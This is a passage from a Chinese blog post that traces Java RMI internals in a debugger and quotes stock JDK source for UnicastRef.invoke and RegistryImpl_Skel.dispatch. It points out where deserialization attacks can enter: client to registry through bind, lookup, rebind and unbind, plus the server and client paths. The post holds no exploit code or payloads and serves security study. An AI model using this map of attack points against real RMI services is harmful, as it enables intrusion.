src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071034195.png"></p><p>此处开始检查bindings 是否已经存在了相应名称的绑定，如果bindings中已经存在相应名称的绑定就抛出异常。其实 bindings 就是一个 HashTable。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071035306.png"></p><p>继续F8执行，来到<code>bindings.put(name, obj);</code>中，</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071037179.png"></p><p>其实就是将服务端代理放进去（这里的调试经过了两次启动，与上面分析的代理端口不一致），到这里，绑定的过程就结束了，其实就是把上面创建的代理和相应的名称放入bindings这个hashtable中而已；</p><h3 id="4-3-4-创建注册中心和绑定小结"><a href="#4-3-4-创建注册中心和绑定小结" class="headerlink" title="4.3.4 创建注册中心和绑定小结"></a>4.3.4 创建注册中心和绑定小结</h3><ul><li>注册中心的创建过程和发布远程对象比较相似，只不是注册中心是创建一个持久对象，该持久对象就是注册中心；</li><li>绑定过程比较容易理解，就是将创建的代理和相应的名称进行绑定；代理中包含了相应的ip地址和端口；</li></ul><h2 id="4-4-客户端请求，客户端调用注册中心"><a href="#4-4-客户端请求，客户端调用注册中心" class="headerlink" title="4.4 客户端请求，客户端调用注册中心"></a>4.4 客户端请求，客户端调用注册中心</h2><h3 id="4-4-1-获取注册中心"><a href="#4-4-1-获取注册中心" class="headerlink" title="4.4.1 获取注册中心"></a>4.4.1 获取注册中心</h3><blockquote><p>这里不存在任意漏洞，为了深入理解RMI，还是进行调试一下；</p></blockquote><p>对客户端连接请求下断点进行调试；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071046056.png"></p><p>直接F7跟进<code>getRegistry()</code>方法中，查看具体的实现方法；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071048367.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071049989.png"></p><p>来到此处后，我们继续F8执行，来到<code>LiveRef</code>定义与赋值这里；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071049819.png"></p><p>又看到了比较熟悉的流程，创建liveRef，再创建ref；其实本质上与注册中心和远程服务类似；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071052909.png"></p><p>这里创建的是我们请求连接的ip地址和port端口的liveRef和ref，然后再<code>creatProxy()</code>；<br>通过提供的IP地址和端口就获取到了注册中心的Stub，然后继续进行下一步的查找远程对象；</p><h3 id="4-4-2-查找远程对象"><a href="#4-4-2-查找远程对象" class="headerlink" title="4.4.2 查找远程对象"></a>4.4.2 查找远程对象</h3><blockquote><p>存在漏洞</p></blockquote><p>由于之前返回的对象是<code>RegistryImpl_Stub</code>类型，调用的对象应该在<code>RegistryImpl_Stub</code>类中的lookup方法</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071106531.png"></p><p>因为对应的 Java 编译过的 class 文件是 1.1 的版本，无法进行打断点，所以会直接跳到其他地方去，比如此处。直接硬分析！</p><p>首先就是我们调用lookup的时候传入了一个String类型的参数<code>remoteObj</code>，对应的就是方法中的形参<code>var1</code>；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071111163.png"></p><p>可以知道我们传入的数据经过了序列化在进行传入。后续注册中心也会经过反序列化读出数据；</p><p>接着下一步，我们看到 <code>super.ref.invoke(var2);</code>，super 就是父类，也就是我们之前说的 <code>UnicastRef</code> 这个类。这里的 <code>invoke()</code> 方法是类似于激活的方法，<code>invoke()</code> 方法里面会调用 <code>call.executeCall()</code>，它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071114582.png"></p><blockquote><p>这个方法后续再细讲，先看整个代码运行的逻辑。</p></blockquote><p>我们的逻辑现在是从 <code>invoke()</code> —&gt; <code>call.executeCall()</code> —&gt; <code>out.getDGCAckHandler()</code>，到 <code>out.getDGCAckHandler()</code> 这个地方的时候，是 try 打头的，这里它有一个异常存在潜在攻击的可能性，如图，中间省略了部分代码。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071118965.png"></p><p>分析<code>in</code>变量的赋值；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071118912.png"></p><p>不难理解，in 就是数据流里面的东西。这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了（如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。）这里的漏洞相比于其他漏洞更为隐蔽。</p><blockquote><p>也就是说，只要调用 <code>invoke()</code>，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。</p><p>上述就是注册中心与客户端进行交互时会产生的攻击。</p></blockquote><p>我们这里继续 f8，看一下到最后一步的时候获取到了什么数据。简单来说就是获取到了 RemoteObj 这个动态代理，其中包含一个 ref。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071124892.png"></p><h3 id="4-4-3-总结"><a href="#4-4-3-总结" class="headerlink" title="4.4.3 总结"></a>4.4.3 总结</h3><ul><li>获取注册中心</li></ul><p>在该部分内容中确实不存在漏洞，过程也相对简单，直接通过传入的ip和port创建Stub即可；</p><ul><li>查找远程对象</li></ul><p>该部分确实存在漏洞攻击的可能性，在处理网络请求的过程中，若存在异常，则将信息全部取出并进行反序列化，从而导致漏洞；<br>这是服务端攻击客户端的可能性，但是异常信息取出进行反序列化实现攻击，似乎没有那么简单。（这也恰恰说明，我的功夫不到家啊~~~）</p><p> 据说，这里可以利用 URLClassLoader 来打，我继续学学吧！</p><h2 id="4-5-客户端请求，客户端请求服务端"><a href="#4-5-客户端请求，客户端请求服务端" class="headerlink" title="4.5 客户端请求，客户端请求服务端"></a>4.5 客户端请求，客户端请求服务端</h2><h3 id="4-5-1-分析查询远程对象"><a href="#4-5-1-分析查询远程对象" class="headerlink" title="4.5.1 分析查询远程对象"></a>4.5.1 分析查询远程对象</h3><blockquote><p>这部分内容存在漏洞，重点关注分析</p></blockquote><p>这里就是客户端请求的第三句代码——<code>remoteObj.sayHello(&quot;hello&quot;);</code></p><p>这里如果 Debug 有问题的话，可以先在 <code>RemoteObjectInvocationHandler</code> 类下的 <code>invoke()</code> 方法的 if 判断里面打个断点，这样才能走进去。调试开始</p><blockquote><p>报错：跳过的断点在java. rmi. server. RemoteObjectInvocationHandler:165, 因为它发生在调试器评估中 排除故障指南</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071303765.png"></p><p>算了，这里我硬看了！不调试了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071312276.png"></p><p>首先经过一串的if判断，都是关于抛出异常的，直接跳过，不影响最后的理解。知道尾部的<code>invokeRemoteMethod(proxy, method, args);</code>，跟进；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071315849.png"></p><p>来到该函数中在继续查看相应的内容，继续跟进，由于ref是<code>UnicastRef</code>，因此我们需要跟进<code>UnicastRef#invoke()</code>；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs plain">public Object invoke(Remote obj,<br>                     Method method,<br>                     Object[] params,<br>                     long opnum)<br>    throws Exception<br>&#123;<br>    if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;<br>        clientRefLog.log(Log.VERBOSE, &quot;method: &quot; + method);<br>    &#125;<br><br>    if (clientCallLog.isLoggable(Log.VERBOSE)) &#123;<br>        logClientCall(obj, method);<br>    &#125;<br><br>    Connection conn = ref.getChannel().newConnection();<br>    RemoteCall call = null;<br>    boolean reuse = true;<br><br>    /* If the call connection is &quot;reused&quot; early, remember not to<br>     * reuse again.<br>     */<br>    boolean alreadyFreed = false;<br><br>    try &#123;<br>        if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;<br>            clientRefLog.log(Log.VERBOSE, &quot;opnum = &quot; + opnum);<br>        &#125;<br><br>        // create call context<br>        call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum);<br><br>        // marshal parameters<br>        try &#123;<br>            ObjectOutput out = call.getOutputStream();<br>            marshalCustomCallData(out);<br>            Class&lt;?&gt;[] types = method.getParameterTypes();<br>            for (int i = 0; i &lt; types.length; i++) &#123;<br>                marshalValue(types[i], params[i], out);<br>            &#125;<br>        &#125; catch (IOException e) &#123;<br>            clientRefLog.log(Log.BRIEF,<br>                &quot;IOException marshalling arguments: &quot;, e);<br>            throw new MarshalException(&quot;error marshalling arguments&quot;, e);<br>        &#125;<br><br>        // unmarshal return<br>        call.executeCall();<br><br>        try &#123;<br>            Class&lt;?&gt; rtype = method.getReturnType();<br>            if (rtype == void.class)<br>                return null;<br>            ObjectInput in = call.getInputStream();<br><br>            /* StreamRemoteCall.done() does not actually make use<br>             * of conn, therefore it is safe to reuse this<br>             * connection before the dirty call is sent for<br>             * registered refs.<br>             */<br>            Object returnValue = unmarshalValue(rtype, in);<br><br>            /* we are freeing the connection now, do not free<br>             * again or reuse.<br>             */<br>            alreadyFreed = true;<br><br>            /* if we got to this point, reuse must have been true. */<br>            clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = true)&quot;);<br><br>            /* Free the call&#x27;s connection early. */<br>            ref.getChannel().free(conn, true);<br><br>            return returnValue;<br><br>        &#125; catch (IOException e) &#123;<br>            clientRefLog.log(Log.BRIEF,<br>                             &quot;IOException unmarshalling return: &quot;, e);<br>            throw new UnmarshalException(&quot;error unmarshalling return&quot;, e);<br>        &#125; catch (ClassNotFoundException e) &#123;<br>            clientRefLog.log(Log.BRIEF,<br>                &quot;ClassNotFoundException unmarshalling return: &quot;, e);<br><br>            throw new UnmarshalException(&quot;error unmarshalling return&quot;, e);<br>        &#125; finally &#123;<br>            try &#123;<br>                call.done();<br>            &#125; catch (IOException e) &#123;<br>                /* WARNING: If the conn has been reused early,<br>                 * then it is too late to recover from thrown<br>                 * IOExceptions caught here. This code is relying<br>                 * on StreamRemoteCall.done() not actually<br>                 * throwing IOExceptions.<br>                 */<br>                reuse = false;<br>            &#125;<br>        &#125;<br><br>    &#125; catch (RuntimeException e) &#123;<br>        /*<br>         * Need to distinguish between client (generated by the<br>         * invoke method itself) and server RuntimeExceptions.<br>         * Client side RuntimeExceptions are likely to have<br>         * corrupted the call connection and those from the server<br>         * are not likely to have done so.  If the exception came<br>         * from the server the call connection should be reused.<br>         */<br>        if ((call == null) ||<br>            (((StreamRemoteCall) call).getServerException() != e))<br>        &#123;<br>            reuse = false;<br>        &#125;<br>        throw e;<br><br>    &#125; catch (RemoteException e) &#123;<br>        /*<br>         * Some failure during call; assume connection cannot<br>         * be reused.  Must assume failure even if ServerException<br>         * or ServerError occurs since these failures can happen<br>         * during parameter deserialization which would leave<br>         * the connection in a corrupted state.<br>         */<br>        reuse = false;<br>        throw e;<br><br>    &#125; catch (Error e) &#123;<br>        /* If errors occurred, the connection is most likely not<br>         *  reusable.<br>         */<br>        reuse = false;<br>        throw e;<br><br>    &#125; finally &#123;<br><br>        /* alreadyFreed ensures that we do not log a reuse that<br>         * may have already happened.<br>         */<br>        if (!alreadyFreed) &#123;<br>            if (clientRefLog.isLoggable(Log.BRIEF)) &#123;<br>                clientRefLog.log(Log.BRIEF, &quot;free connection (reuse = &quot; +<br>                                       reuse + &quot;)&quot;);<br>            &#125;<br>            ref.getChannel().free(conn, reuse);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这方法真长啊！这是一个重载的方法，这个重载的 <code>invoke</code> 方法作用是创建了一个连接，和之前也比较类似。我们可以看一下它具体的逻辑实现。</p><p>在该方法中存在一个 <code>marshalValue()</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071319975.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071321017.png"></p><p>它会序列化一个值，这个值其实就是我们传进的参数 <code>hello</code>，它的逻辑如图。判断一堆类型，之后再进行序列化。</p><p>继续往后看刚才的<code>invoke()</code>方法我们看到一个注释 <code>// unmarshal return</code>，后面接的是 <code>call.executeCall()</code>，之前我们也看到了这个方法，也就是说只要 RMI 处理网络请求，就一定会执行到这个方法，这里是存在危险的，原理上面已经代码跟过一遍了 ~</p><p>继续往后看！</p><p>这里有一个 <code>unmarshalValueSee</code> 的方法，因为现在我们传进去的类型是 String，不符合上面的一系列类型，这里会进行反序列化的操作，把这个数据读回来，这里是存在入口类的攻击点的。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410071323060.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410102308199.png"></p><p>这里的in数据其实就是执行完毕远程函数后的输出结果；</p><h3 id="4-5-2-总结"><a href="#4-5-2-总结" class="headerlink" title="4.5.2 总结"></a>4.5.2 总结</h3><ul><li>在注册中心 –&gt; 服务端这里，查找远程对象的时候是存在攻击的。</li></ul><p>具体表现形式是服务端打客户端，入口类在 <code>call.executeCall()</code>，里面抛出异常的时候会进行反序列化。<br>这里可以利用 URLClassLoader 来打，具体的攻击在后续文章会写。</p><p>在服务端 —&gt; 客户端这里，也是存在攻击的，一共是两个点：一个是 <code>call.executeCall()</code>，另一个点是 <code>unmarshalValueSee</code> 这里。</p><p> <code>unmarshalValueSee</code> 这里会将执行的输出返回到客户端，然后客户端进行反序列化从而实现攻击；</p><ul><li>再总结一下代码的流程</li></ul><p>分为三步走，先获取注册中心，再查找远程对象，查找远程对象这里获取到了一个 ref，最后客户端发出请求，与服务端建立连接，进行通信。</p><h2 id="4-6-客户端发起请求，注册中心如何处理"><a href="#4-6-客户端发起请求，注册中心如何处理" class="headerlink" title="4.6 客户端发起请求，注册中心如何处理"></a>4.6 客户端发起请求，注册中心如何处理</h2><h3 id="4-6-1-注册中心处理分析"><a href="#4-6-1-注册中心处理分析" class="headerlink" title="4.6.1 注册中心处理分析"></a>4.6.1 注册中心处理分析</h3><p>先说说断点怎么打，因为客户端那里，我们操作的是 Stub，服务端这边操作的是 Skel。在有了 Skel 之后应当是存在 Target 里面的，所以我们的断点打到处理 Target 的地方。断点位置如图</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072221399.png"></p><p>先点 Server 的 Debug，再跑 Client 就可以了，成功的打断点如上图；F8往下执行，查看target中包含了什么内容；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072224114.png"></p><p>可以发现target中包含了一个stub，stub中有一个ref，对应的IP和port为注册中心监听端口；继续向下执行；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072226786.png"></p><p><code>final Dispatcher disp = target.getDispatcher();</code>将target中的disp取出放到disp中，其中disp中包含了<code>skel</code>和<code>ref</code>等内容；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072228802.png"></p><p>继续往下走，它会调用 disp 的 dispatch 方法，我们跳进去看一下 <code>disp.dispatch()</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072231075.png"></p><p>继续走，我们目前的 <code>skel</code> 不为 null，会到 <code>oldDispatch()</code> 这里，跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072232705.png"></p><p>继续执行到410行的<code>skel.dispatch(obj, call, op, hash);</code>，这里无法继续跟进了，因为具体的方法实现在<code>RegistryImpl_Skel#dispatch()</code>无法下断点跟进；<br><font style="background-color:#f3bb2f;">下面就是 </font><code>skel.dispatch()</code><font style="background-color:#f3bb2f;"> 的过程了，这里才是重点，这里就是很多师傅文章里面会提到的 客户端打注册中心 的攻击方式。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs plain">public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception &#123;<br>        if (var4 != 4905912898345647071L) &#123;<br>            throw new SkeletonMismatchException(&quot;interface hash mismatch&quot;);<br>        &#125; else &#123;<br>            RegistryImpl var6 = (RegistryImpl)var1;<br>            String var7;<br>            Remote var8;<br>            ObjectInput var10;<br>            ObjectInput var11;<br>            switch (var3) &#123;<br>                case 0:<br>                    try &#123;<br>                        var11 = var2.getInputStream();<br>                        var7 = (String)var11.readObject();<br>                        var8 = (Remote)var11.readObject();<br>                    &#125; catch (IOException var94) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var94);<br>                    &#125; catch (ClassNotFoundException var95) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var95);<br>                    &#125; finally &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.bind(var7, var8);<br><br>                    try &#123;<br>                        var2.getResultStream(true);<br>                        break;<br>                    &#125; catch (IOException var93) &#123;<br>                        throw new MarshalException(&quot;error marshalling return&quot;, var93);<br>                    &#125;<br>                case 1:<br>                    var2.releaseInputStream();<br>                    String[] var97 = var6.list();<br><br>                    try &#123;<br>                        ObjectOutput var98 = var2.getResultStream(true);<br>                        var98.writeObject(var97);<br>                        break;<br>                    &#125; catch (IOException var92) &#123;<br>                        throw new MarshalException(&quot;error marshalling return&quot;, var92);<br>                    &#125;<br>                case 2:<br>                    try &#123;<br>                        var10 = var2.getInputStream();<br>                        var7 = (String)var10.readObject();<br>                    &#125; catch (IOException var89) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var89);<br>                    &#125; catch (ClassNotFoundException var90) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var90);<br>                    &#125; finally &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var8 = var6.lookup(var7);<br><br>                    try &#123;<br>                        ObjectOutput var9 = var2.getResultStream(true);<br>                        var9.writeObject(var8);<br>                        break;<br>                    &#125; catch (IOException var88) &#123;<br>                        throw new MarshalException(&quot;error marshalling return&quot;, var88);<br>                    &#125;<br>                case 3:<br>                    try &#123;<br>                        var11 = var2.getInputStream();<br>                        var7 = (String)var11.readObject();<br>                        var8 = (Remote)var11.readObject();<br>                    &#125; catch (IOException var85) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var85);<br>                    &#125; catch (ClassNotFoundException var86) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var86);<br>                    &#125; finally &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.rebind(var7, var8);<br><br>                    try &#123;<br>                        var2.getResultStream(true);<br>                        break;<br>                    &#125; catch (IOException var84) &#123;<br>                        throw new MarshalException(&quot;error marshalling return&quot;, var84);<br>                    &#125;<br>                case 4:<br>                    try &#123;<br>                        var10 = var2.getInputStream();<br>                        var7 = (String)var10.readObject();<br>                    &#125; catch (IOException var81) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var81);<br>                    &#125; catch (ClassNotFoundException var82) &#123;<br>                        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var82);<br>                    &#125; finally &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.unbind(var7);<br><br>                    try &#123;<br>                        var2.getResultStream(true);<br>                        break;<br>                    &#125; catch (IOException var80) &#123;<br>                        throw new MarshalException(&quot;error marshalling return&quot;, var80);<br>                    &#125;<br>                default:<br>                    throw new UnmarshalException(&quot;invalid method number&quot;);<br>            &#125;<br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>上述的方法的实现源码，分析一下源码；</p><p>我们与注册中心进行交互可以使用如下几种方式：</p><ul><li>list</li><li>bind</li><li>rebind</li><li>unbind</li><li>lookup</li></ul><p>这几种方法位于 <code>RegistryImpl_Skel#dispatch</code> 中，也就是我们现在 dispatch 这个方法的地方。</p><p>如果存在对传入的对象调用 <code>readObject</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要中间是有反序列化就是可以攻击的，而且我们是从客户端打到注册中心，这其实是黑客们最喜欢的攻击方式。我们来看一看谁可以攻击。</p><ul><li>bind——可以进行反序列化攻击</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072243890.png"></p><ul><li>lookup——可以进行反序列化攻击</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072243781.png"></p><ul><li>rebind——可以进行反序列化攻击</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072244397.png"></p><ul><li>unbind——可以进行反序列化攻击</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410072244798.png"></p><h3 id="4-6-2-总结"><a href="#4-6-2-总结" class="headerlink" title="4.6.2 总结"></a>4.6.2 总结</h3><p>简单，注册中心就是处理 Target，进行 Skel 的生成与处理。</p><p>漏洞点是在 dispatch 这里，存在反序列化的入口类（除了list，其他都可以攻击）。这里可以结合 CC 链子打的。</p><h2 id="4-7-客户端发起请求，服务端做了什么"><a href="#4-7-客户端发起请求，服务端做了什么" class="headerlink" title="4.7 客户端发起请求，服务端做了什么"></a>4.7 客户端发起请求，服务端做了什么</h2><p>与调试注册中心处理时一致，将断点打在如图的位置；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101518117.png"></p><p>首先运行Server的debug，然后再运行Client即可，可以看到程序成功运行到断点处；</p><blockquote><p>调试这里有一点小坑，打完两个断点之后，我们得到的第一个 Target 中的 Stub 是 RegistryImpl 的，我们要的不是这个，我们需要的服务端动态代理的Stub，即Proxy</p></blockquote><h3 id="4-7-1-服务端处理分析"><a href="#4-7-1-服务端处理分析" class="headerlink" title="4.7.1 服务端处理分析"></a>4.7.1 服务端处理分析</h3><p>继续F9执行程序，再查看target中的stub，知道得到Proxy的Stub为止，如下图；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101525048.png"></p><p>我们继续F8执行到<code>dispatch()</code>方法处，跟进</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101527397.png"></p><p>继续执行程序来到判断结构可以知道，无论是num值还是skel，都表示我们不会直接执行<code>oldDispatch()</code>函数，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101529430.png"></p><p>继续F8执行程序可以看到下面就是到了获取输入流，以及Method，Method其实就是我们在客户端调用的<code>sayHello()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101530836.png"></p><p>继续执行就会来到循环当中的<code>unmarshalValue()</code>方法，之前也提到过很多次这个方法，</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101533166.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410101535022.png"></p><p>其中存在漏洞，会将我们传入的参数<code>hello</code>进行反序列化读出</p><h3 id="4-7-2-总结"><a href="#4-7-2-总结" class="headerlink" title="4.7.2 总结"></a>4.7.2 总结</h3><p>这里的服务端处理客户端的请求连接的过程中存在漏洞，会讲客户端发送过来的参数进行反序列化读取出来；</p><h2 id="4-8-DGC"><a href="#4-8-DGC" class="headerlink" title="4.8 DGC"></a>4.8 